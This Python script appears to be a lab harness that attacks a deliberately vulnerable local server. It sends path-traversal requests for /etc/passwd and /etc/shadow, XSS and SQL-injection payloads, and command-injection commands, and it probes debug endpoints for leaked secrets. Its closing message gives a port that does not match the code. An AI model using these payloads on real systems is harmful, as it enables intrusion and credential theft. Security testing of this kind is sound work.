#!/usr/bin/env python3
"""
Attack script to test vulnerable server security
Tests multiple attack scenarios
"""
import requests
import json
import time

SERVER_URL = "http://localhost:7777"

def print_attack(title, success, details):
    """Print attack result"""
    status = "✅ SUCCESS" if success else "❌ FAILED"
    print(f"\n{status}: {title}")
    print(f"Details: {details}")

def attack_path_traversal():
    """Test 1: Path Traversal Attack"""
    print("\n" + "="*60)
    print("ATTACK 1: Path Traversal")
    print("="*60)
    
    # Try to read sensitive files
    files_to_steal = [
        "/etc/passwd",
        "/etc/shadow",
        "./vulnerable_server.py",
        "../vulnerable_server.py"
    ]
    
    for file_path in files_to_steal:
        try:
            response = requests.get(f"{SERVER_URL}/file?filename={file_path}", timeout=5)
            if response.status_code == 200 and len(response.text) > 0:
                print_attack(f"Path Traversal - {file_path}", True, f"File read successfully")
                print(f"Content preview: {response.text[:200]}...")
                return True
        except:
            pass
    
    print_attack("Path Traversal", False, "Could not read any files")
    return False

def attack_xss():
    """Test 2: XSS Attack"""
    print("\n" + "="*60)
    print("ATTACK 2: Cross-Site Scripting (XSS)")
    print("="*60)
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//"
    ]
    
    for payload in xss_payloads:
        try:
            response = requests.get(f"{SERVER_URL}/search?q={payload}", timeout=5)
            if payload in response.text:
                print_attack(f"XSS - {payload[:30]}...", True, "Payload reflected without sanitization")
                return True
        except:
            pass
    
    print_attack("XSS", False, "Payloads were sanitized or not reflected")
    return False

def attack_sql_injection():
    """Test 3: SQL Injection"""
    print("\n" + "="*60)
    print("ATTACK 3: SQL Injection")
    print("="*60)
    
    sql_payloads = [
        {"username": "admin' OR '1'='1", "password": "anything"},
        {"username": "admin' --", "password": "anything"},
        {"username": "' OR '1'='1' --", "password": "anything"},
        {"username": "admin'#", "password": "anything"}
    ]
    
    for payload in sql_payloads:
        try:
            response = requests.post(f"{SERVER_URL}/login", data=payload, timeout=5)
            result = response.json()
            if result.get("status") == "success":
                print_attack(f"SQL Injection - {payload['username']}", True, f"Logged in as: {result.get('user')}")
                print(f"Query executed: {result.get('query')}")
                return True
        except:
            pass
    
    print_attack("SQL Injection", False, "All injections blocked")
    return False

def attack_command_injection():
    """Test 4: Command Injection"""
    print("\n" + "="*60)
    print("ATTACK 4: Command Injection")
    print("="*60)
    
    cmd_payloads = [
        "ls -la",
        "whoami",
        "cat /etc/passwd",
        "pwd",
        "id"
    ]
    
    for cmd in cmd_payloads:
        try:
            response = requests.post(f"{SERVER_URL}/exec", data={"cmd": cmd}, timeout=5)
            result = response.json()
            if result.get("status") == "success":
                print_attack(f"Command Injection - {cmd}", True, f"Output: {result.get('output')[:100]}...")
                return True
        except:
            pass
    
    print_attack("Command Injection", False, "Commands blocked")
    return False

def attack_information_disclosure():
    """Test 5: Information Disclosure"""
    print("\n" + "="*60)
    print("ATTACK 5: Information Disclosure")
    print("="*60)
    
    try:
        response = requests.get(f"{SERVER_URL}/debug", timeout=5)
        debug_info = response.json()
        
        # Check for sensitive information
        has_users = "users" in debug_info
        has_env = "environment" in debug_info
        has_secrets = any("key" in str(k).lower() or "secret" in str(k).lower() for k in debug_info.keys())
        
        if has_users or has_env or has_secrets:
            print_attack("Information Disclosure", True, f"Leaked: users={has_users}, env={has_env}, secrets={has_secrets}")
            print(f"Debug info preview: {json.dumps(debug_info, indent=2)[:500]}...")
            return True
    except:
        pass
    
    print_attack("Information Disclosure", False, "No sensitive info leaked")
    return False

def attack_status_endpoint():
    """Test 6: Unprotected Status Endpoint"""
    print("\n" + "="*60)
    print("ATTACK 6: Unprotected Status Endpoint")
    print("="*60)
    
    try:
        response = requests.get(f"{SERVER_URL}/status", timeout=5)
        status = response.json()
        
        if "secret_key" in status:
            print_attack("Status Endpoint", True, f"Secret key leaked: {status['secret_key']}")
            return True
    except:
        pass
    
    print_attack("Status Endpoint", False, "No secrets in status")
    return False

def run_all_attacks():
    """Run all attack scenarios"""
    print("\n" + "="*60)
    print("STARTING SECURITY ATTACK TESTS")
    print("="*60)
    print(f"Target: {SERVER_URL}")
    print("⚠️  Testing vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY")
    
    results = {
        "Path Traversal": attack_path_traversal(),
        "XSS": attack_xss(),
        "SQL Injection": attack_sql_injection(),
        "Command Injection": attack_command_injection(),
        "Information Disclosure": attack_information_disclosure(),
        "Status Endpoint": attack_status_endpoint()
    }
    
    # Summary
    print("\n" + "="*60)
    print("ATTACK SUMMARY")
    print("="*60)
    
    successful = sum(1 for v in results.values() if v)
    total = len(results)
    
    for attack, success in results.items():
        status = "✅ VULNERABLE" if success else "❌ PROTECTED"
        print(f"{attack}: {status}")
    
    print(f"\nTotal: {successful}/{total} attacks successful")
    print(f"Security Score: {((total - successful) / total) * 100:.1f}% protected")
    
    return results

if __name__ == "__main__":
    print("⚠️  Make sure vulnerable_server.py is running on port 9999")
    input("Press Enter to start attacks...")
    
    run_all_attacks()
